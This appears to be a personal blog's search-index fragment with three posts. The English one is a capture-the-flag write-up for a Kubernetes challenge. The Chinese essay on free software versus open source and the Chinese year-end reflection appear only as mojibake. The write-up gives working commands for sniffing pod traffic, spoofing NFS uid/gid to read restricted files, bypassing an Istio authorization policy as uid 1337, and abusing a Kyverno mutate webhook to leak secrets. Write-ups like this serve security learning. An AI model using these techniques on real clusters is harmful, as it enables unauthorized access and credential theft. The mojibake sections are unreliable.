ä»–å®£ä¼ , ä½†ä»ä¸å¼ºåˆ¶.\nå¤äººæœ‰äº‘: å›å­ä¸å™¨, å¼ºè°ƒäº†å›å­ä¸èƒ½åœç•™åœ¨å™¨å…·è¿™ç§è¡¨è±¡è€Œæ›´åº”è¯¥æ³¨é‡å†…åœ¨ä¿®å…». ç„¶è€Œè®½åˆºçš„æ˜¯, ä»¥è‡ªç”±ä¸ºçº²çš„fsf, åœ¨å¸¸å¹´ä¸å•†ä¸šå…¬å¸åœ¨é“å¾·å±‚é¢çš„äº‰é”‹ç›¸å¯¹ä¸­åˆ†æ•£äº†å¤ªå¤šç²¾åŠ›, è¿™ç§å›´ç»•ç€\u0026quot;å™¨\u0026quot;çš„é“å¾·è¾ƒé‡æœ€ç»ˆè®©ä»–ä»¬é”™è¿‡äº†å¼€å‘GNUæ“ä½œç³»ç»Ÿå†…æ ¸çš„æœºä¼š, å¤šå¹´ä»¥æ¥è¢«å¤–ç•Œå†·å˜²çƒ­è®½. ç›¸å, ä»¥Linusä¸ºä»£è¡¨çš„å¼€æºè¿åŠ¨é€‰æ‹©æ‹’ç»å°†æ”¿æ²»æ¿€æƒ…ä¸å†·å†°å†°çš„ä»£ç ç»‘å®š, å°†è½¯ä»¶ä»£ç ä»é“å¾·åŒ…è¢±ä¸­è§£æ”¾å‡ºæ¥, å¼€å¯äº†Linuxç³»ç»Ÿå’Œæ–°å…´é»‘å®¢æ–‡åŒ–çš„ç‹‚é£™å‘å±•.\næ€»ç»“æ¥çœ‹, å¼€æºè¿åŠ¨æ˜¯å¯¹è‡ªç”±è½¯ä»¶çš„ä¸€ç§ä¿®æ­£, æ˜¯å°†åè€…ä¸­çš„æ”¿æ²»æ¿€æƒ…å‰”é™¤åçš„æ›´åŠ é€‚åº”å•†ä¸šç¤¾ä¼šçš„äº§ç‰©. ä½†æ˜¯, å°±ä¸ªäººæ¥è¯´, æˆ‘ä¾æ—§å°Šæ•¬è¿™ä½ä»¥ä¸€å·±ä¹‹åŠ›åœ¨ä¸Šä¸ªä¸–çºªæŠ—è¡¡æ•´ä¸ªå•†ä¸šä¸–ç•Œçš„ä¼ å¥‡é»‘å®¢, æ¯«æ— ç–‘é—®, ä»–å’Œå…¶ä»–è‡ªç”±è½¯ä»¶è¿åŠ¨çš„å‚ä¸è€…ä¸€èµ·å¼€åˆ›äº†ä¸€ä¸ªæ—¶ä»£, è€Œä»–ä»¬çš„é—äº§, GPLåè®®, ä¹Ÿå°†æ°¸è¿œå­˜åœ¨.\n","permalink":"https://dragonbox.top/posts/read-free-opensource/","summary":"\u003cp\u003eå€Ÿç€\u0026quot;è‹¥ä¸ºè‡ªç”±æ•…\u0026quot;è¿™æœ¬ä¹¦, è¯»è€…å¯ä»¥æ›´æ·±åˆ»åœ°ç†è§£å¼€æºè½¯ä»¶ä¸è‡ªç”±è½¯ä»¶çš„å¼‚åŒä¹‹å¤„. ç”±äºåœ¨å®é™…æƒ…å†µä¸­, äºŒè€…éƒ½å¼€æ”¾äº†æºä»£ç , å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¹Ÿéƒ½ä¼šé‡‡ç”¨äº’ç›¸å…¼å®¹ç”šè‡³ç›¸åŒçš„åè®®, å› æ­¤å…¶ä¸­çš„åŒºåˆ«åœ¨è¶Šæ¥è¶Šå¤šäººçœ¼é‡Œé€æ¸æ¨¡ç³Š. å¦‚ä»Šçš„è½¯ä»¶è¡Œä¸š, å¤§å¤šæ•°äººåœ¨è¡¨è¾¾ç›¸åŒæ„æ€æ—¶æ›´åŠ å€¾å‘äºä½¿ç”¨\u0026quot;Open-source\u0026quot;è€Œä¸æ˜¯\u0026quot;Free\u0026quot;è¿™ä¸ªè¯, ä¸ä»…èƒ½å¤Ÿç›´è§‚æ¸…æ™°åœ°è¡¨è¾¾ä¿¡æ¯, ä¹Ÿèƒ½é¿å…\u0026quot;Free\u0026quot;è¿™ä¸ªå•è¯å¸¸ç”¨çš„\u0026quot;å…è´¹\u0026quot;ä¹‹æ„ (ä¸ºäº†äººä»¬è®¤è¯†åˆ°\u0026quot;Free software\u0026quot;ä¸­çš„Freeä¸æ˜¯å…è´¹è€Œæ˜¯è‡ªç”±çš„æ„æ€, Stallman å¯å¼ºè°ƒäº†è®¸å¤šæ¬¡, ä½†å¾ˆé—æ†¾, å¤§éƒ¨åˆ†å…¬å¸åœ¨å¬åˆ°ä»–çš„å¼ºè°ƒå‰å°±ä¼šè¢«å“è·‘). ä½†åªè¦äº†è§£è¿‡è‡ªç”±è½¯ä»¶å’Œå¼€æºè½¯ä»¶çš„å†å², å°±èƒ½å‘ç°å…¶ä¸­å·®è·å¹¶ä¸åœ¨æŠ€æœ¯è€Œæ˜¯åœ¨é“å¾·å±‚é¢ä¸Šçš„åˆ†æ­§.\u003c/p\u003e\n\u003cp\u003eå…·ä½“æ¥è¯´, å¼€æºè¿åŠ¨æ›´åŠ æ³¨é‡è½¯ä»¶å¼€å‘æ–¹å¼çš„å¼€æ”¾æ€§, ä¸€ç§ç±»ä¼¼äºé›†å¸‚åœºæ™¯ä¸­äººäººå¯å‚ä¸çš„, ä»¥è½¯ä»¶è´¨é‡ä¸ºæœ€ç»ˆç›®æ ‡çš„å€¡è®®, å®ƒå…³æ³¨çš„æ˜¯è½¯ä»¶æœ¬èº«, å› æ­¤é¢‡å…·å·¥ç¨‹å¸ˆçš„çº¯ç²¹ç‰¹æ€§; ç›¸å, è‡ªç”±è½¯ä»¶è¿åŠ¨ä¸ä»…ä»…æ³¨é‡è½¯ä»¶å¼€å‘æ–¹å¼, æ›´èµ‹äºˆè½¯ä»¶æœ¬èº«ä»¥é“å¾·å±æ€§, å®ƒæ›´å¼ºè°ƒè½¯ä»¶ç”¨æˆ·çš„è‡ªç”±ä¿®æ”¹å’Œè‡ªç”±ä¼ æ’­çš„æƒåˆ©, ä»¥\u0026quot;äººçš„è‡ªç”±\u0026quot;ä¸ºä¸­å¿ƒ, ä»»ä½•é™åˆ¶è½¯ä»¶ç”¨æˆ·è¿™äº›æƒåˆ©çš„ä¸ªäººå’Œç»„ç»‡éƒ½æ˜¯\u0026quot;é‚ªæ¶\u0026quot;ä¸”éœ€è¦è¢«æŠµåˆ¶çš„, è¿™è®©å®ƒæ›´åƒæ˜¯ä¸€ç§ç¤¾ä¼šè¿åŠ¨. æœ‰ä¸€å¥Stallmançš„è¯å¯ä»¥å¾ˆå¥½åœ°é˜é‡Šå…¶æ„: \u0026ldquo;å¦‚æœä¸€ä¸ªè½¯ä»¶æ˜¯ä¸è‡ªç”±çš„, å“ªæ€•å®ƒçš„æŠ€æœ¯éå¸¸å…ˆè¿›, æˆ‘ä¹Ÿä¸ä¼šå»ä½¿ç”¨å®ƒ\u0026rdquo;, ç›¸å, å¼€æºè¿åŠ¨çš„ä»£è¡¨äººç‰©Linusæ›¾ç»åœ¨ä¸€æ¬¡å¤§ä¼šä¸Šå…¬å¼€è¡¨ç¤ºè‡ªå·±æ˜¯Microsoft Powerpointçš„ç²‰ä¸ç”¨æˆ·, äºŒè€…çš„å†²çªä¹Ÿç”±æ­¤è€Œæ¥: åœ¨å¼€æºä¸»ä¹‰è€…çœ¼ä¸­, å•†ä¸šè½¯ä»¶æ˜¯ä¸€ä¸ªä¸å®Œç¾çš„è§£å†³æ–¹æ¡ˆ, ä½†æ˜¯åœ¨è‡ªç”±è½¯ä»¶è€…çœ¼ä¸­, å•†ä¸šè½¯ä»¶åˆ™æ˜¯å½»å¤´å½»å°¾çš„æ•Œäºº.\u003c/p\u003e\n\u003cp\u003eä¸¤ç§è¿åŠ¨å¹¶ä¸æ˜¯äº’ç›¸ç‹¬ç«‹çš„, ç›¸å, å¼€æºè¿åŠ¨è„±èƒäºè‡ªç”±è½¯ä»¶è¿åŠ¨, æ˜¯åè€…ä¸ºäº†é€‚åº”è½¯ä»¶è¡Œä¸šå•†ä¸šå‘å±•çš„ä¸€ç§å¿…ç„¶æ¼”å˜, ä¹Ÿæ˜¯è¿½æ±‚è‡ªç”±çš„ç†æƒ³ä¸»ä¹‰è€…åœ¨ç°å®å±¡å±¡ç¢°å£åçš„ä¸€ç§å¦¥å.\u003c/p\u003e\n\u003cp\u003eåœ¨ä»Šå¤©, å°½ç®¡Stallmanä¾æ—§åœ¨å…¨çƒå„åœ°å¯¹ç€ä¼—å¤šæ…•åè€Œæ¥çš„å¬ä¼—å¸ƒé“, ä»–ä¹Ÿä¾æ—§èƒ½ç»™äººä»¥éœ‡æ’¼äººå¿ƒå¼€æ‚Ÿæ˜æ™ºçš„æ„Ÿè§‰, ä½†è¿™ç§æ„Ÿè§‰è¿‡ååˆæœ‰è°ä¼šçœŸçš„å»è¿½éšä»–çš„æ­¥ä¼, å»å°†è‡ªå·±ç”Ÿæ´»ä¸­çš„æ‰€æœ‰ä¸“æœ‰è½¯ä»¶æ¸…é™¤å‘¢? è¦çŸ¥é“, Stallmançš„æ”»å‡»ç›®æ ‡, å¯ä¸ä»…ä»…æ˜¯ä¸ªäººè®¡ç®—æœºä¸­çš„ä¸“æœ‰è½¯ä»¶, ä»»ä½•éè‡ªç”±è½¯ä»¶, ä¸ç®¡æ˜¯æ±½è½¦ä¸Šçš„, é£æœºä¸Šçš„, åŠ¨è½¦ä¸Šçš„, ä¹ƒè‡³æ”¶éŸ³æœºé‡Œçš„, éƒ½æ˜¯ä»–çš„æŠµåˆ¶å¯¹è±¡. è€Œå¯¹äºæ²¡æœ‰èµ„æºçš„æ™®é€šäººæ¥è¯´, å•æ˜¯æ‰¾ä¸€å°å½»å¤´å½»å°¾æºç å¯è§(æŒ‡ä¸»æ¿ä¸Šçš„å›ºä»¶)çš„ç¬”è®°æœ¬ç”µè„‘, å°±å·²ç»æ˜¯ä¸€ä»¶éå¸¸å›°éš¾ä¸”å®Œå…¨æ²¡æœ‰æ€§ä»·æ¯”çš„äº‹æƒ…äº†.\u003c/p\u003e\n\u003cp\u003eä»æˆ‘çš„è§’åº¦æ¥çœ‹, è™½ç„¶å¾ˆé—æ†¾, ä½†æ˜¯è‡ªå¼€æºè¿åŠ¨æˆé•¿èµ·æ¥å, è‡ªç”±è½¯ä»¶å­˜åœ¨çš„æ„ä¹‰å°±æ²¡æœ‰ä»¥å‰é‚£ä¹ˆå¤§äº†, ç”šè‡³è¯´çš„ä¸å®¢æ°”ä¸€äº›, å¾®ä¹å…¶å¾®. è¿™æ˜¯éœ€è¦è”ç³»å†å²èƒŒæ™¯æ¥çœ‹çš„, åœ¨è‡ªç”±è½¯ä»¶è¿åŠ¨è¯ç”Ÿçš„é‚£ä¸ªå¹´ä»£, è½¯ä»¶è¡Œä¸šæåº¦é—­å¡, äº’è”ç½‘æ‰åˆšåˆšè¯ç”Ÿ, å„ä¸ªå…¬å¸éƒ½åœ¨è‡ªå·±è’™å¤´é—­é—¨é€ è½¦, æå°½æ‰€èƒ½ä¿æŠ¤è‡ªå®¶çš„ä»£ç ä¸è¢«å…¬å¼€, ç›¸äº’ä¹‹é—´æ›´ä¸ç”¨è¯´æœ‰ä»€ä¹ˆå…¼å®¹åˆä½œäº†. è‡ªç”±è½¯ä»¶çš„è¯ç”Ÿæ˜¯å¯¹é‚£ä¸ªå°é—­ç¯å¢ƒçš„ä¸€ç§å½»å¤´å½»å°¾çš„åå›, å®ƒä»¥ä¸€ç§åæ¿€çš„å§¿æ€åœ¨è½¯ä»¶è¡Œä¸šé€æ¸æ‰“åŠ¨äº†ä¸€æ‰¹äºº, ä¹ŸåŸ¹å…»èµ·äº†åˆ«å…·ä¸€æ ¼æ›´åŠ å¼€æ”¾çš„æ–‡åŒ–.\u003c/p\u003e","title":"è‹¥ä¸ºè‡ªç”±æ•…, è½¯ä»¶çš†å¯æŠ›"},{"content":"Long time no CTF~~\nRECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan\nThis blog is good written link\nFinding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.\nAs we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.\ntcpdump -i any host reporting-service.k8s-lan-party.svc.cluster.local and tcp -w traffic.pcap and the flag was in the traffic.pcap\nDATA LEAKAGE The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based.\nAt first glance, I thought the data storage is nfs, and found the existence of /efs/flag.txt. However, there is no enough permission to read it, while I failed to mount the remote storage to local host, so I stopped and didn\u0026rsquo;t have any progress until the end of the game.\nBy executing mount, here we got:\nfs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.30.72,local_lock=none,addr=192.168.124.98) Since the remote storage use nfs4, we should specify the version when listing it.\nnfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4 try to cat the remote flag.txt, but there is no enough permission.\nnfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4 However, according to the libnfs document, we could spoof uid and gid by adding parameters to the nfs url and get elevated privileges.\nnfs-cat \u0026#34;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4\u0026amp;uid=0\u0026amp;gid=0\u0026#34; The Beauty and The Ist Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don\u0026rsquo;t abuse this power; use it responsibly and with caution.\nThe given policy is\napiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: name: istio-get-flag namespace: k8s-lan-party spec: action: DENY selector: matchLabels: app: \u0026#34;{flag-pod-name}\u0026#34; rules: - from: - source: namespaces: [\u0026#34;k8s-lan-party\u0026#34;] to: - operation: methods: [\u0026#34;POST\u0026#34;, \u0026#34;GET\u0026#34;] The policy in this challenge block GET and POST requests from namespace k8s-lan-party Find Istio service\ndnscan -subnet 10.100.0.1/16 The request to this address will be denied. However, there seems to be user that can bypass the Istio\u0026rsquo;s IPTables rules from hist#2.\ncat /etc/passwd | grep 1337\nAnd we got user istio, According to ncc report and Istio Iptables, the 1337 uid is used to distinguish between traffic originating from proxy vs the applications, which means we can bypass the policy restriction by switching to user istio and send requests, which would be recognized as traffic from istio sidercar proxy.\nWho will guard the guardians? Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the administrative services.\nThe given policy:\napiVersion: kyverno.io/v1 kind: Policy metadata: name: apply-flag-to-env namespace: sensitive-ns spec: rules: - name: inject-env-vars match: resources: kinds: - Pod mutate: patchStrategicMerge: spec: containers: - name: \u0026#34;*\u0026#34; env: - name: FLAG value: \u0026#34;{flag}\u0026#34; Kyverno is designed for policy management. The policy will inject flag into Pod resource created under sensitive-ns.\nAccording to GPT, AdmissionReview is a kind of API resource used in admission control process. K8s supports two types of admission control webhooks to handle AdmissionReview: ValidatingAdmissionWebhook and MutatingAdmissionWebhook, the latter is called before validating object correctness, it can modify objects in the request, while the former is called after all MutatingAdmissionWebhook to check the state of the object for validity but does not modify it.\nObviously, the policy facilitates MutatingAdmissionWebhook to modify object.\nReconnoiter services first:\n10.100.86.210 -\u0026gt; kyverno-cleanup-controller.kyverno.svc.cluster.local. 10.100.217.223 -\u0026gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local. 10.100.232.19 -\u0026gt; kyverno-svc.kyverno.svc.cluster.local. 10.100.126.98 -\u0026gt; kyverno-svc-metrics.kyverno.svc.cluster.local. 10.100.158.213 -\u0026gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local. 10.100.171.174 -\u0026gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local. What if we can utilize the MutatingAdmissionWebhook to steal the secret since we can access to https://kyverno-svc.kyverno.svc.cluster.local/mutate? The AdmissionReview requests to this api will be responsed by object modified by the kyverno, which makes a lot sense.\nuse the following resource to generate AdmissionReview\napiVersion: v1 kind: Pod metadata: name: curl-flag namespace: sensitive-ns spec: containers: - name: curl-container image: curlimages/curl ./kube-review create pod.yaml \u0026gt; pod.json curl -k -X POST \\ https://kyverno-svc.kyverno.svc.cluster.local/mutate \\ -H \u0026#39;content-type: application/json\u0026#39; \\ --data-binary \u0026#34;@pod.json\u0026#34; We got:\n{\u0026#34;kind\u0026#34;:\u0026#34;AdmissionReview\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;admission.k8s.io/v1\u0026#34;,\u0026#34;request\u0026#34;:{\u0026#34;uid\u0026#34;:\u0026#34;dd916513-9b96-4220-ae2b-b21470612d69\u0026#34;,\u0026#34;kind\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;},\u0026#34;resource\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;resource\u0026#34;:\u0026#34;pods\u0026#34;},\u0026#34;requestKind\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;},\u0026#34;requestResource\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;resource\u0026#34;:\u0026#34;pods\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;curl-flag\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;sensitive-ns\u0026#34;,\u0026#34;operation\u0026#34;:\u0026#34;CREATE\u0026#34;,\u0026#34;userInfo\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;kube-review\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;ee8332cb-afa6-412e-b60a-641f23d28980\u0026#34;},\u0026#34;object\u0026#34;:{\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;curl-flag\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;sensitive-ns\u0026#34;,\u0026#34;creationTimestamp\u0026#34;:null},\u0026#34;spec\u0026#34;:{\u0026#34;containers\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;curl-container\u0026#34;,\u0026#34;image\u0026#34;:\u0026#34;curlimages/curl\u0026#34;,\u0026#34;resources\u0026#34;:{}}]},\u0026#34;status\u0026#34;:{}},\u0026#34;oldObject\u0026#34;:null,\u0026#34;dryRun\u0026#34;:true,\u0026#34;options\u0026#34;:{\u0026#34;kind\u0026#34;:\u0026#34;CreateOptions\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;meta.k8s.io/v1\u0026#34;}},\u0026#34;response\u0026#34;:{\u0026#34;uid\u0026#34;:\u0026#34;dd916513-9b96-4220-ae2b-b21470612d69\u0026#34;,\u0026#34;allowed\u0026#34;:true,\u0026#34;patch\u0026#34;:\u0026#34;W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d\u0026#34;,\u0026#34;patchType\u0026#34;:\u0026#34;JSONPatch\u0026#34;}} ","permalink":"https://dragonbox.top/posts/ctf-k8s-lan-party/","summary":"\u003cp\u003eLong time no CTF~~\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRECON\u003c/h2\u003e\n\u003cp\u003eJust check the environment related to K8s using \u003ccode\u003eenv\u003c/code\u003e and reconnoiter internal service using \u003ccode\u003ednscan\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"recon.png\" alt=\"recon\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis blog is good written \u003ca href=\"https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html\"\u003elink\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"finding-neighbours\"\u003eFinding Neighbours\u003c/h2\u003e\n\u003cp\u003eAccording to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to \u003ccode\u003ereporting-service.k8s-lan-party.svc.cluster.local\u003c/code\u003e.\u003c/p\u003e","title":"k8s lan party"},{"content":" ä¸€äº‹æ— æˆçš„ä¸€å¹´, ä½†ä¹Ÿç®—æœ‰æ‰€æ”¶è·, å¦‚æœæ•™è®­ä¹Ÿç®—æ”¶è·çš„è¯.\n2023å¹´ç»™æˆ‘çš„æ„Ÿè§‰æ˜¯å¿«, å¤ªå¿«äº†, å…´è®¸æ˜¯ç–«æƒ…åçš„è¿™ä¸€å¹´é‡Œäººä»¬ç§¯æ”’è®¸ä¹…çš„åŠ³åŠ¨çƒ­æƒ…ç»ˆäºå¾—åˆ°äº†é‡Šæ”¾, æ­£å¼å›æ‰€çš„è‡ªå·±ä¹Ÿä½“ä¼šåˆ°äº†è¿™ç§å¿«èŠ‚å¥çš„ç”Ÿæ´». ç„¶è€Œè‡ªå·±å…¶å®å¹¶ä¸èƒ½å¾ˆå¥½çš„é€‚åº”, æœ¬ç§‘æ¯•ä¸šå, ç–«æƒ…æˆä¸ºäº†å¾ˆå¤šäº‹æƒ…éƒ½ä¸å¿…å»åšçš„æ¥å£, æ¸æ¸çš„, æˆ‘åœ¨è¿™ç§æ¶ˆæçš„æ°›å›´ä¸­å˜å¾—è¶Šæ¥è¶Šæ‡’æƒ°. è€Œä»Šå¹´, æ­£æ˜¯å……æ»¡æ•™è®­çš„ä¸€å¹´. é™¤å»é‚£äº›æˆ–å¶ç„¶æˆ–ä¾¥å¹¸è€Œå¾—çš„å°ä¾¿å®œ, ä»Šå¹´çš„è‡ªå·±å¯è°“æ˜¯ä¸€äº‹æ— æˆ, å› æ­¤, è¿™ç¯‡æ–‡ç« ä¸å…¶æ˜¯å¹´åº¦æ€»ç»“, ä¸å¦‚è¯´æ˜¯ä¸€ç¯‡å¹´åº¦çš„æ£€è®¨æ–‡.\nç¼ºä¹æ²Ÿé€š, é—­é—¨é€ è½¦ è¿™æ˜¯ä»Šå¹´è®ºæ–‡è¿›åº¦ç¼“æ…¢çš„æœ€ç›´æ¥åŸå› , æ—©åœ¨ä»Šå¹´å¹´åˆçš„æ—¶å€™, æˆ‘å°±æœ‰äº†è®ºæ–‡çš„æƒ³æ³•, ä½†æ˜¯åœ¨æ²¡æœ‰å’Œå¸ˆå…„ä¸å¯¼å¸ˆå……åˆ†æ²Ÿé€šçš„æƒ…å†µä¸‹åªé¡¾è‡ªå·±åŸ‹å¤´åš, å¤©é©¬è¡Œç©ºçš„è®¾æƒ³å’Œé£˜å¿½ä¸å®šçš„ç‚¹å­è®©è‡ªå·±å¸¸å¸¸ä¸œæ‰“ä¸€æ£è¥¿æ‰“ä¸€è€™. ç»“æœæ…¢æ…¢æ‚ æ‚ åˆ°äº†å…«æœˆä»½çš„æ—¶å€™å¯¼å¸ˆå’Œæˆ‘æ²Ÿé€šçš„æ—¶å€™, åªç”¨äº†å‡ å¥è¯å°±è®©æˆ‘æ±—æµæµƒèƒŒ, èŒ…å¡é¡¿å¼€, è‡ªå·±åŸæ¥åœ¨ä¸é‡è¦çš„äº‹æƒ…ä¸Šæµªè´¹äº†è¿™ä¹ˆå¤šçš„æ—¶é—´å’Œç²¾åŠ›! å…¶å®ç°åœ¨æƒ³æ¥, è‡ªå·±é—­é—¨é€ è½¦å›é¿äº¤æµçš„æ·±åº¦å¿ƒç†åŸå› , ä¹Ÿæ˜¯å¯¹è‡ªå·±ä¸è‡ªä¿¡å¯¼è‡´çš„, ç„¶è€Œå›é¿ä¸èƒ½è§£å†³é—®é¢˜, åªèƒ½è§£å†³è®©é—®é¢˜æ¶åŒ–.\næœ‰é‰´äºæ­¤, åœ¨ä¸‹ä¸€å¹´ä¸­, æˆ‘å¿…é¡»ç§¯æå’Œå¸ˆå…„å¯¼å¸ˆæ²Ÿé€šäº¤æµåˆ†äº«è‡ªå·±çš„æƒ³æ³•, å½“æˆ‘è®¤è¯†åˆ°è‡ªå·±è¡¨éœ²å‡ºäº†å®³ç¾å’Œå›é¿çš„å¿ƒç†çš„æ—¶å€™, æˆ‘éœ€è¦è°ƒç”¨è‡ªå·±çš„ç†æ€§æ¥å…‹æœå¼±ç‚¹, é©±åŠ¨è‡ªå·±å‘å‰è¿ˆæ­¥.\næ²‰è¿·é…ç½®å’Œæ¸¸æˆ, åœ¨æ— æ„ä¹‰çš„äº‹æƒ…ä¸Šæµªè´¹äº†å¤ªå¤šå¿ƒæ™º åœ¨è®¨è®ºè¿™ç‚¹ä¹‹å‰, é¦–å…ˆéœ€è¦æ˜ç¡®ä¸€ä¸‹, æ¯”èµ·æ—¶é—´, æˆ‘æ›´å…³æ³¨ç²¾åŠ›çš„ç®¡ç†. å¦‚æœè¯´ç¼ºä¹æ²Ÿé€šæ˜¯è®©æˆ‘åœ¨åˆ©ç”¨ç²¾åŠ›çš„æˆ˜ç•¥å¤§æ–¹å‘ä¸Šå‡ºç°äº†åå·®, é‚£ä¹ˆæ²‰è¿·é…ç½®ä¸æ¸¸æˆå°±æ˜¯å°±æ˜¯æˆ˜æœ¯ä¸Šçš„å¤±è´¥. æ¸¸æˆè‡ªä¸å¿…è¯´, æœ¬æ¥å°±æ˜¯æ¶ˆç£¨ç²¾åŠ›çš„å‘æ˜, è€Œç°ä»£çš„æ¸¸æˆäº§ä¸šä¸ºäº†è¿åˆè¶Šæ¥è¶Šå¤šå¹´è½»äººæ— å¤„å‘æ³„çš„ç²¾åŠ›, ç ”ç©¶å‡ºäº†å„ç§ä»¤äººç²¾ç–²åŠ›å°½çœ¼èŠ±ç¼­ä¹±çš„ç©æ³•, ç€å®å¯æ€•, è€Œè¿™å…¶ä¸­æˆ‘ä»Šå¹´æ¥è§¦çš„ååæ˜¯æœ€è€—è´¹ä¸ªäººç²¾åŠ›çš„ä¸¤ç±»æ¸¸æˆ: æˆ˜æ——ç±»(æ˜æ—¥æ–¹èˆŸ) å’Œ å¡ç‰Œç±»(æ¸¸æˆç‹), å‰è€…æ¶ˆè€—ç²¾åŠ›çš„ç¨‹åº¦è¿˜ä¸ç®—å¾ˆå¤š, å› ä¸ºæˆ‘ä¹Ÿæ— å¿ƒæ·±å…¥æ¸¸ç©, ä½†åè€…ä¸ä»…ä»…æ˜¯ç²¾åŠ›æ€æ‰‹, è¿˜æ˜¯ä¸€ä¸ªæ— æ­¢å°½çš„æ—¶é—´é»‘æ´: æ— è®ºæ˜¯ç»„å»ºå¡ç»„è¿˜æ˜¯æ¥è§¦å¯¹å†³è¿‡ç¨‹ä¸­é‡åˆ°çš„æ–°å¡ç»„, æˆ‘éƒ½éœ€è¦é€¼è¿«è‡ªå·±å»é˜…è¯»æ™¦æ¶©æ— è¶£çš„æ–‡æœ¬, æ›´ä¸ç”¨è¯´åŒæ–¹å›åˆä¸­çš„ç­‰å¾…æ—¶é—´äº†.\né‚£ä¹ˆç©é…ç½®åˆæ˜¯æ€ä¹ˆä¸€å›äº‹? éš¾é“å¯¹ç”Ÿäº§åŠ›å·¥å…·è¿›è¡Œæ”¹è‰¯ä¹Ÿæ˜¯ä¸å¯¹çš„å—? å¹¶ä¸æ˜¯, é€‚å½“çš„é…ç½®çš„ç¡®æœ‰åŠ©äºæå‡ç”Ÿäº§è¿‡ç¨‹ä¸­çš„ä½“éªŒ, ä½†é—®é¢˜æ˜¯, ä¸€æ—¦å‘ç°è‡ªå·±èŠ±åœ¨é…ç½®ä¸Šçš„æ—¶é—´è¿œè¿œè¶…è¿‡äº†ä»·å€¼äº§å‡ºçš„æ—¶é—´, é‚£ä¹ˆå°±åº”è¯¥åœä¸‹æ¥æŠŠç²¾åŠ›æŠ•å…¥é‚£äº›çœŸæ­£é‡è¦çš„å·¥ä½œä¸­å». è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå½“æˆ‘çœ‹åˆ° è¿™ä¸ªè§†é¢‘ çš„æ—¶å€™æ·±ä»¥ä¸ºç„¶, æè‡´çš„æ•ˆç‡ä¸ä»…ä»…æ˜¯ä¸€ä¸ªä¼ªéœ€æ±‚, è¿˜æ˜¯ä¸€ä¸ªè°è¨€, æ ¹æœ¬ä¸å­˜åœ¨è¿™æ ·çš„ä¸œè¥¿, å½“ä½ çš„çœ¼é‡Œåªæœ‰å·¥å…·çš„æ—¶å€™, æ°¸è¿œæœ‰çœ‹èµ·æ¥æ›´å¥½çš„å·¥å…·ç”¨æ›´å¤šçš„åŠŸèƒ½(ä½†æˆ‘å¯èƒ½å®Œå…¨ç”¨ä¸åˆ°)æ¥å¸å¼•æˆ‘. 